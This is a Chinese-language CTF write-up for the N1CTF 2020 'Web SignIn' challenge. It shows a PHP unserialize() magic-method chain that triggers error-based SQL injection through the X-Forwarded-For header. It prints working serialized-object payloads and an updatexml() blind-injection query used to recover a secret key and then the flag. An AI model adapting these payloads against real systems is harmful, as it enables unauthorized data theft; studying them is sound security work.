# N1CTF 2020 Web SignIn Writeup

## 题目简述

题目给出一段 PHP 登录逻辑。入口直接对 `input` 参数执行 `unserialize()`；`flag` 对象的 `__wakeup()` 会把成员 `ip` 交给 `stristr()`，而 `ip` 类的 `__toString()` 又把 `X-Forwarded-For` 拼进 MySQL `INSERT` 语句。最终只有 `flag::$check` 与服务端密钥满足 MD5 比较时，析构函数才会读取 `/flag`。

决定性问题不是单独的反序列化或 SQL 注入，而是二者形成的调用链：反序列化负责触发 `ip::__toString()`，报错型盲注负责取得密钥，最后再构造第二个对象读取 flag。

## 解题过程

### 触发魔术方法链

令 `flag::$ip` 本身是一个 `ip` 对象：

```text
O:4:"flag":1:{s:2:"ip";O:2:"ip":0:{}}
```

`unserialize()` 恢复对象后调用 `flag::__wakeup()`。`stristr($this->ip, "n1ctf")` 需要字符串，于是隐式调用 `ip::__toString()`。该方法执行的核心语句等价于：

```sql
INSERT INTO n1ip(`ip`, `time`) VALUES ('<X-Forwarded-For>', '<time>')
```

过滤器只删除了 `case`、`when`、`sleep`、`benchmark`、`pad`、`like`、`count`、`GET_LOCK` 等关键词，没有处理引号，也没有参数化查询。

### 利用 MySQL 错误作为真假信道

`__toString()` 在查询失败时会返回 MySQL 错误文本，而 `__wakeup()` 又检查返回值中是否含有 `n1ctf`。因此可用 `updatexml()` 主动制造错误，并让错误内容随当前猜测变化：

```sql
'||(SELECT ip FROM n1ip WHERE updatexml(
  1,
  concat('~',(
    SELECT IF(
      ascii(substring((SELECT `key` FROM n1key),1,1))=110,
      'n1ctf',
      'wrong'
    )
  ),'~'),
  3
))||'
```

逐位枚举可恢复 `n1key` 表的保留字列 `` `key` ``。官方利用脚本得到：

```text
n1ctf20205bf75ab0a30dfc0c
```

反引号不能省略，否则 `key` 会被 MySQL 当作关键字解析。

### 带入密钥读取 flag

取得密钥后，不再需要触发 SQL 注入。直接反序列化一个 `flag` 对象，把 `ip` 设为含 `n1ctf` 的普通字符串，并把 `check` 设为已恢复的密钥：

```text
O:4:"flag":2:{s:2:"ip";s:5:"n1ctf";s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";}
```

对象生命周期结束时，析构函数中的 MD5 条件成立，服务端返回 `/flag`。公开赛后记录给出的结果为：

```text
n1ctf{you_g0t_1t_hack_for_fun}
```

## 方法总结

本题展示了 PHP 魔术方法的跨类利用：可控反序列化对象不必直接执行危险函数，只要能把对象送入字符串上下文，就可能继续触发 `__toString()`。分析这类题时应按实际调用顺序检查每个魔术方法、隐式类型转换和析构条件；SQL 注入则应优先寻找错误回显等稳定信道，而不是只盯着被过滤的延时函数。
